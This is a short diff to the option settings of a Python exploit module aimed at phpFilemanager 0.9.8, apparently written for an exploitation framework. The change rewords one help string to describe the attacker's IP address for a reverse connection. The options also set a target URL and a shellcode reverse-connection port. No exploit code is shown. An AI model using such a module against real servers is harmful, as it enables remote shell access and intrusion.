@@ -22,7 +22,7 @@ INFO['AUTHOR'] = "dmts"
 OPTIONS = OrderedDict()
 OPTIONS["URL"] = "example.com", dict(description = 'URL to phpFilemanager-0.9.8')
 #OPTIONS["COMMAND"] = "id", dict(description = 'Command to run')
-OPTIONS["LOCAL_IP_ADDRESS"] = "192.168.1.115", dict(description = 'System IP address (ex. 192.168.10.20)')
+OPTIONS["LOCAL_IP_ADDRESS"] = "192.168.1.115", dict(description = 'IP address for reverse connection (ex. 192.168.10.20)')
 OPTIONS["REVERSE_CONNECTION_PORT"] = "4000", dict(description = 'Reverse connection port for shellcode')
 #####################################################################
 class exploit(Sploit):
